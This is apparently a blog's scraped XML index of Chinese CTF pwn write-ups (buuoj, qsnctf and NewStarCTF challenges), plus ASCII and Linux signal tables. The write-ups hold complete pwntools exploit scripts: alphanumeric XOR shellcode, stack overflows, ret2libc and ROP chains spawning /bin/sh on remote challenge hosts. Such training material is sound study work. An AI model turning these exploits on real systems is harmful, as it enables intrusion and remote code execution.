+0.
+
+
+1101111.
+157.
+111.
+6F
+o
+0.
+
+
+1110000.
+160.
+112.
+70.
+p
+0.
+
+
+1110001.
+161.
+113.
+71.
+q
+0.
+
+
+1110010.
+162.
+114.
+72.
+r
+0.
+
+
+1110011.
+163.
+115.
+73.
+s
+0.
+
+
+1110100.
+164.
+116.
+74.
+t
+0.
+
+
+1110101.
+165.
+117.
+75.
+u
+0.
+
+
+1110110.
+166.
+118.
+76.
+v
+0.
+
+
+1110111.
+167.
+119.
+77.
+w
+0.
+
+
+1111000.
+170.
+120.
+78.
+x
+0.
+
+
+1111001.
+171.
+121.
+79.
+y
+0.
+
+
+1111010.
+172.
+122.
+7A
+z
+0.
+
+
+1111011.
+173.
+123.
+7B
+{
+0.
+
+
+1111100.
+174.
+124.
+7C
+
+
+
+
+1111101.
+175.
+125.
+7D
+}
+0.
+
+
+1111110.
+176.
+126.
+7E
+~
+0.
+
+
+1111111.
+177.
+127.
+7F
+DEL (Delete)
+删除
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux退出状态码</title>
+    <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
+    <content><![CDATA[
+
+
+信号编号
+信号名称
+信号描述
+默认处理方式
+Exit code
+
+
+
+1.
+SIGHUP
+挂起
+终止
+1.
+
+
+2.
+SIGINT
+终端中断
+终止
+2.
+
+
+3.
+SIGQUIT
+终端退出
+终止、core dump
+131.
+
+
+4.
+SIGILL
+非法指令
+终止、core dump
+132.
+
+
+5.
+SIGTRAP
+跟踪 &#x2F; 断点陷阱
+终止、core dump
+133.
+
+
+6.
+SIGABRT
+终止进程
+终止、core dump
+134.
+
+
+7.
+SIGBUS
+Bus error
+终止、core dump
+135.
+
+
+8.
+SIGFPE
+算术异常
+终止、core dump
+136.
+
+
+9.
+SIGKILL
+杀死进程（必杀）
+终止
+9.
+
+
+10.
+SIGUSR1
+用户自定义信号 1
+终止
+10.
+
+
+11.
+SIGSEGV
+段错误
+终止、core dump
+139.
+
+
+12.
+SIGUSR2
+用户自定义信号 2
+终止
+12.
+
+
+13.
+SIGPIPE
+管道断开
+终止
+13.
+
+
+14.
+SIGALRM
+定时器信号
+终止
+14.
+
+
+15.
+SIGTERM
+终止进程
+终止
+15.
+
+
+16.
+SIGSTKFLT
+栈错误
+终止
+16.
+
+
+17.
+SIGCHLD
+子进程退出
+忽略
+无
+
+
+18.
+SIGCONT
+继续执行
+若停止则继续执行
+无
+
+
+19.
+SIGSTOP
+停止执行（必停）
+暂停执行
+无
+
+
+20.
+SIGTSTP
+停止
+暂停执行
+无
+
+
+21.
+SIGTTIN
+Stopped (tty input)
+暂停执行
+无
+
+
+22.
+SIGTTOU
+Stopped (tty output)
+暂停执行
+无
+
+
+23.
+SIGURG
+IO 紧急数据
+忽略
+无
+
+
+24.
+SIGXCPU
+突破对 cpu 时间的限制
+终止、core dump
+152.
+
+
+25.
+SIGXFSZ
+突破对文件大小的限制
+终止、core dump
+153.
+
+
+26.
+SIGVTALRM
+虚拟定时器超时
+终止
+26.
+
+
+27.
+SIGPROF
+性能分析定时器超时
+终止
+27.
+
+
+28.
+SIGWINCH
+终端窗口尺寸发生变化
+忽略
+无
+
+
+29.
+SIGIO
+IO 时可能产生
+终止
+29.
+
+
+30.
+SIGPWR
+电量行将耗尽
+终止
+30.
+
+
+31.
+SIGSYS
+错误的系统调用
+终止、core dump
+159.
+
+
+34~64
+SIGRTMIN~SIGRTMAX
+实时信号
+
+
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[NewStarCTF 2023 公开赛道]shell code revenge</title>
+    <url>//docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/</url>
+    <content><![CDATA[
+特殊shellcode
+https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge
+
+这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。
+
+大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字母和数字就不会被break——跳出。
+所以我们要创造一个只有大写字母和数字的shellcode？
+然后我也懒得checksec了，而且用的是rsp——也就是64位。开了一些保护啥的，反正jumpout到的66660000h这个地址在上面的mmap里面写入了权限’7’（第三参数），也就是可读可写可执行。
+整个代码的逻辑是：出现Show me your magic之后，进入一个for循环，for循环一开始会有一个read让我们输入数据，因为是一个char类型指针buf，每次读取一个值。然后下面的strncpy()会把我们一个一个输入的buf存到src里面的src复制到我们的0x66660000地址里面，我们可以看main函数的堆栈视图：
+
+我们要将数据存放到src的位置，而且只能输入264个字符（这264字符是可用的shellcode长度）。
+不过这道题目比较难，是一个可见字符shellcode。要构造一个可见字符shellcode还必须是大写和数字就很麻烦了，目前自动生成的大部分都是大小写+数字的组合。
+这边用了一个read函数，其中第一参数是0，也就是fd里面的标准输入，我输入进去的东西都会从这个里面获取到，第二参数是buf变量地址（一个指针）也就是读取的大小，第三参数是读取权限。
+
+汇编这里会写的更清楚一点，edi的值变成了0。我们可以通过这个值进行运算，例如[edi+0x10]得到的值就是0+0x10&#x3D;0x10。
+现在的思路是，我可以用可见字符来构造一个最小的shellcode，目的是为了调用read函数，让read函数再一次读取值存放到66660000h这个地址上，覆盖我之前的为了调用read函数而构造的shellcode，再一次读取的shellcode不会有什么奇怪的判定条件，它可以直接执行我输入进去的任何东西。
+构造第一段shellcode - read函数构造可见ASCII shellcode是一个很麻烦的工作，我们先看一下普通的shellcode，拿64位举例：
+;;nasm -f elf64 shellcode64.asm;;ld -m elf_x86_64 -o shellcode64 shellcode64.o;;objdump -d shellcode64global _start_start:    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;    xor rsi, rsi           ; 清空rsi（argv参数设为0）    xor rdx, rdx           ; 清空rdx（envp参数设为0）    push 0x3b              ; 把系统调用号0x3b压入栈    pop rax                ; 从栈弹出数据到rax，设置系统调用号    syscall                ; 执行系统调用
+
+最麻烦的部分就是/bin/sh和syscall，一个是字符串，另外一个是命令。其中syscall的机器码是0x0f05，汇编的书籍或Intel&#x2F;AMD开发者用书里面也会说到。
+可是syscall不是可见字符啊，更不是A-Z，0-9之间的数值。这要怎么办？
+异或加密异或是一种逻辑运算，A⊕B得到的值是C，而C⊕B之后得到的值就是A。逻辑如下：、
+
+如此，我就可以构造一个这样的设计：
+
+
+我们假设字符’A’为密钥，将syscall作为原始数据输入计算得到加密数据：0x0f05⊕0x4141&#x3D;0x4e44（都为可见字符），所以我们确实可以用它来作为密钥。
+加密后的syscall需要写入内存，但是直接写入的指令mov机器码很显然不是可见字符，而xor为可见字符0x33&#x3D;’3’。或者0x31&#x3D;’1’。
+为什么有两个？是因为xor的运算符定义是这样的：
+xor [a值], [b值]
+
+而在汇编里面，寄存器需要放在前面，其他的放在后面，也就变成了:&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 寄存器, 其他值&lt;/font&gt;，所代表的意思也就是将寄存器里面的值和其他值进行异或处理后，存储到寄存器里面。
+如果我们要实现：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 其他值, 寄存器&lt;/font&gt;，也就是将其他值和寄存器做异或处理后，将计算后的值存储到其他值里面，这个时候在机器码里面，依旧要按照：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor机器码 寄存器机器码，其他值&lt;/font&gt;的顺序。
+于是就有了两个xor，一个代表的是第一种情况，一个代表第二种情况，分别为&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x33&lt;/font&gt;和&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31&lt;/font&gt;
+异或解密syscall这个时候我们就可以开始构造一些东西了，首先看代码，
+我们会发现在jmp到66660000h这个地址前，我们的eax被归0了，所以就可以利用这一点，配合xor来创造
+并且制造出syscall的加密数据形式0x4e444e44（输入两遍是为了防止一遍不运行）
+首先一开始是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor eax,NUM&lt;/font&gt;，实际上是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;[rdx+0x38]&lt;/font&gt;，为什么是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;rdx+NUM&lt;/font&gt;？在这里我们看到esi和edx都被复制为了66660000h，实际上这个就是打定了 内存区域中的基地址 ，那为什么偏偏是这个地址呢？这其实有点玄学，因为似乎rdx会作为这个偏移值的基地址，而刚好这边初始化了edx。而大概率选择了rdx作为基地址来偏移。
+我们构造这么一个逻辑：
+
+这里面有很多零碎的知识点，我们先讲一个大概，后面慢慢补充：
+首先是上面的机器码部分，因为程序必须输入可见字符，其中第一部分的可见字符是0x300x39，可见字符’0’‘9’的部分。我在这里输入的是0x33 0x42 addr1，这个代码的汇编样式是：xor rax, [addr1]，目的是将rax里面的值改成’A’，0x42是寄存器rax的机器码。rax的值一开始为0，A⊕0&#x3D;A，而		
+rax==0, [addr]==&#x27;A&#x27;rax=rax⊕[addr1]   =0⊕&#x27;A&#x27;   =&#x27;A&#x27;
+
+通过这一步，我就可以把rax的值改成’A’了。
+然后第二步，使用xor指令配合修改成’A’值的寄存器rax对下面的加密后syscall做处理。第一个加密syscall的起始地址为addr2，利用&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31 0x42 addr2&lt;/font&gt;这个命令，就可以修改addr2中的数据。逻辑为：[addr2] ⊕ rax &#x3D;
+[addr2]==0x4e, rax==&#x27;A&#x27;[addr2]=[addr2]⊕rax       =0x4e⊕0x41       =0x0f
+
+第三步，我们要还原rax寄存器的值为0，为什么？因为我们的核心逻辑是再调用一次read函数，然后读取我们写入的第二段shellcode（可以直接进入&#x2F;bin&#x2F;sh的）到特定的内存里，然后让PC，也就是程序计数器读到第二段shellcode的内容执行即可。用rax里面的值随便找一个’A’做异或即可。
+rax==&#x27;A&#x27; [addr1]==&#x27;A&#x27;rax=rax⊕[addr1]   =&#x27;A&#x27;⊕&#x27;A&#x27;   =&#x27;A&#x27;
+
+如此完成后，即可。
+现在的问题是addr2和addr1应该是多少？
+因为我们输入的addr2和addr1必须是可见字符，也就是0x30-0x39之间的数值，而二遍syscall最多占用四个地址。所以我们把第一个syscall的起始地址addr2放在0x30的位置就行了。中间用pop rcx这种方式来过度，他的机器码刚好也是一个可见字符，而rcx在程序中这个寄存器也没有用到，他里面的值是多少不重要（类似于NOP滑块指令，目的只是塞入值，并且让程序读到这些中间值又可以运行）
+而addr的地址则为0x30后4个数字（因为包括0x30，所以第4个数字实际上是0x33），在第五位的时候塞入数据’A’做填充。一般而言只要两个’A’就行了。我们这边填充8个A。所以第一段的代码就被写出来了：
+payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]# payload += b&#x27;\x31\x42\x38&#x27;  #31 42 38 xor DWORD PTR [rdx+0x38], eax 这个可以保证最后rdx0x38里面的值变成A？payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)
+
+一些没有讲的小问题
+1、为什么我只异或了0x30地址上的4e，syscall却正常运作了呢？
+不知为何，寄存器不知道调用的是eax还是rax，其实不重要，他会与后面所有的字符A做异或，然后再与两个字节的syscall，也就是两个0x4e44做处理。如果我在这里后面的字符’A’只有两个的话就会与第一个0x4e44做处理，这个是gdb后的结果，原理是什么我也不清楚…所以字符’A’的长度必须大于2，不然0x44的部分就不会被处理了。
+2、如果我把payload中的\x38改成\x3a（也是存有’A’的地址），为什么运行不了呢？
+因为0x3a是字符’:’，不是可见字符……
+第二段shellcode第二段就很简单了，我只需要放入NOP字符滑过和覆盖之前的内容即可，然后再塞入&#x2F;bin&#x2F;sh的shellcode即可。
+p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))
+
+
+
+全部代码：#[NewStarCTF 2023 public race]shellcode revengefrom pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=27424p = remote(ip,port)payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)pause()p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn_2019_s_9</title>
+    <url>//docx/ciscn_2019_s_9/</url>
+    <content><![CDATA[
+Shellcode 栈溢出
+https://buuoj.cn/challenges#ciscn_2019_s_9
+
+首先checksec一下，看一下大概内容：
+
+IDA打开之后，发现有一个后门函数hint，逻辑如下：
+
+使用此函数的时候，执行esp里面的内容（使用了jmp），我们不需要这些上面什么乱七八糟的东西，我们只需要.text里面的0x08048554的jmp esp就行了。先记下来这是我们可以利用的漏洞。
+
+然后这里是程序唯一一个输入口，也就是说大概率这里有漏洞： 他首先可以让我输入32h的内容，不过通过伪C代码（其实汇编也能看到），这个字符串的长度只有24。也就是说可以构造栈溢出，这个就很简单了。那么我现在构造含有shellcode这样的一个payload：
+
+所以说，大概代码如下：
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29162)# p = process(&quot;./ciscn_s_9&quot;)#shellcode = asm(shellcraft.sh())shellcode_handmade = asm(&quot;&quot;&quot;    xor eax,eax    push 0x0068732f    push 0x6e69622f    mov ebx, esp     mov al, 0xb    int 0x80                         &quot;&quot;&quot;)jmp_esp_addr = 0x8048554shell = asm(&#x27;&#x27;&#x27;sub esp,0x28call esp&#x27;&#x27;&#x27;)payload = shellcode_handmade.ljust(32+4,b&#x27;a&#x27;) + p32(jmp_esp_addr) + shellprint(payload)p.sendafter(b&#x27;tell?\n&#x27;,payload)p.interactive()
+
+如果直接用shellcraft.sh()的话，生成出来的shellcode就太大了，会超过程序给我们的栈可用长度（38字节）
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>easy-shellcode</title>
+    <url>//docx/easy-shellcode/</url>
+    <content><![CDATA[
+类型：shellcode、栈溢出
+https://www.qsnctf.com/  题目叫做：Easy_Shellcode
+
+
+
+输入然后栈中执行，一开始的时候会输出v4的地址。
+
+PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。
+exp:
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(v4_addr)shellcode = asm(shellcraft.sh())payload = shellcodepayload += b&#x27;\x90&#x27;*(0x100-len(shellcode)+8)+p64(v4_addr)# print(payload)p.send(payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>qsnctf</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level1</title>
+    <url>//docx/jarvisoj_level1/</url>
+    <content><![CDATA[checksec
+
+
+
+保护全关，32位系统。其中一开始会输出buf的地址
+这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。
+exp：
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27;*(136-len(payload)+4)payload += p32(buf_addr)p.send(payload)p.interactive()
+
+这个线上似乎没有setbuf，所以输入和输出有点小问题。
+
+似乎需要我先输入什么才会有反应…
+妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：
+
+他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。
+似乎还是不行…
+还有一个libc的办法来做，思路是这样的：
+构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和&#x2F;bin&#x2F;sh字符串地址，然后再次利用漏洞构造rop调用system(‘\bin\sh’)即可。
+
+from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28043file_addr = &#x27;./jarvisoj_level1&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload =b&#x27;a&#x27; * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) p.send(payload)write_addr = u32(io.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)	libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+        <tag>ROP-ret2syscall</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level2</title>
+    <url>//docx/jarvisoj_level2/</url>
+    <content><![CDATA[
+ROP-ret2text，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2
+
+首先checksec一下：
+
+32位，有栈堆不可执行。
+
+main函数调用了system函数，说明我们可以知道system函数的地址，找一下：
+
+system_addr = 0x08048320
+再看一下main函数中调用的另外一个函数vulnerable_function()
+
+非常明显的栈溢出。
+回忆一下栈帧结构：
+
+在这里，我们首先溢出覆盖vulnerable_function()函数的返回地址，将返回地址修改成system函数，然后再往system函数里面塞入参数“&#x2F;bin&#x2F;sh”即可。
+
+在system函数的栈帧结构是这样的：command参数在返回地址的上面，所以我们的payload的构造思路是这样的：
+
+然后还需要一个参数“&#x2F;bin&#x2F;sh”，非常好的是我们不需要自己构造了，在Strings视图里面找到了一个存有此参数的地址，我们直接把这个地址塞进去即可。0x0804A024
+
+exp:
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28815file_addr = &#x27;./jarvisoj_level2&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)system_addr=0x08048320binsh_str_addr=0x0804A024payload = b&#x27;a&#x27;*(136+4)+p32(system_addr)+b&#x27;a&#x27;*4+p32(binsh_str_addr)print(payload)p.send(payload)p.interactive()
+
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level2_64</title>
+    <url>//docx/jarvisoj_level2_64/</url>
+    <content><![CDATA[
+ROP-ret2text，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2_x64
+
+是jarvisoj_level2的64版本。
+按照32位的思路，我们找一下system函数和“&#x2F;bin&#x2F;sh”即可。
+
+
+system_addr = 0x00000000004004C0
+binsh_str_addr = 0x0000000000600A90
+
+这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如saved registers。
+然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）
+
+所以我们要把0x0000000000600A90传递给rdi才行。
+
+通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。
+其payload构造思路也变成了：
+
+整个流程就是：先调用pop rdi，在rdi里面塞入&#x2F;bin&#x2F;sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成&#x2F;bin&#x2F;sh了。
+exp:
+from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level = &#x27;debug&#x27;, binary=file_path, os = &#x27;linux&#x27;)ip=&#x27;nnode5.buuoj.cn&#x27;port=27500# p = remote(ip,port)p = process(file_path)elf = ELF(file_path)system_addr=0x00000000004004C0system_plt = elf.plt[&#x27;system&#x27;]print(system_plt)binsh_str_addr=0x600A90pop_rdi_ret_addr=0x4006b3payload = b&#x27;a&#x27;*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)print(payload)p.sendafter(&#x27;Input:&#x27;,payload)p.interactive()
+
+后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+        <tag>ROP-ret2text</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2020_shellcode</title>
+    <url>//docx/mrctf2020_shellcode/</url>
+    <content><![CDATA[
+类型：pwn、shellcode 
+https://buuoj.cn/challenges#mrctf2020_shellcode
+
+首先检查文件
+
+大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。
+
+一整个流程是这样的，然后F5也没有办法正常反编译成伪C。
+
+整个使用流程大概如此。
+再回到汇编，在输出之后可以让我读取值。因为call了read函数
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。
+
+
+这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。
+通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。
+通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）
+在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：
+
+然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。
+我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。
+不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。
+
+在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())p = remote(&quot;node5.buuoj.cn&quot;,26437)#p = process(&quot;./mrctf2020_shellcode&quot;)payload = shellcodep.send(payload)p.interactive()
+
+直接用自带工具构造一个shellcode做成payload，一把梭直接结束。
+
+ls后flag在根目录下，直接cat，然后结束。
+孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？
+是的，现在我们来回顾一下这个傻逼read函数：
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);
+
+fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？
+我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。
+
+我们写一个带有返回值的函数，然后编译之后gdb调试一下：
+
+当我们把add中的return给运行完的时候，返回值也就是10+20&#x3D;&#x3D;30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而_read函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。
+也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：
+#include &lt;stdio.h&gt;int main() &#123;    setbuf(0,0);    setbuf(0,0);    setbuf(0,0);    char str[410];    if(read(0,str,0x400)&gt;0)        call(str);    return 0;&#125;
+
+这个只是伪C代码，大概这样写不能还原题目。就这样吧…
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2020_shellcode_revenge</title>
+    <url>//docx/mrctf2020_shellcode_revenge/</url>
+    <content><![CDATA[
+类型：shellcode 字符审查
+https://buuoj.cn/challenges#mrctf2020_shellcode
+
+一如既往的checksec
+
+打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。
+
+看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。
+然后原理和mrctf2020_shellcode一样，读入什么执行什么。
+我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py
+ok了，然后我们就得到64位的shellcode字符串化的串为：
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
+
+操，太长了。然后我发现用python2的方法生成的可以打通
+exp如下：
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26117file_addr = &#x27;./mrctf2020_shellcode_revenge&#x27;p = remote(ip,port)#p = process(file_addr)elf = ELF(file_addr)shellcode = b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;payload = shellcodeprint(payload)p.sendafter(b&#x27;magic&#x27;,payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>overflow_ez_32</title>
+    <url>//docx/overflow_ez_32/</url>
+    <content><![CDATA[首先checksec：
+
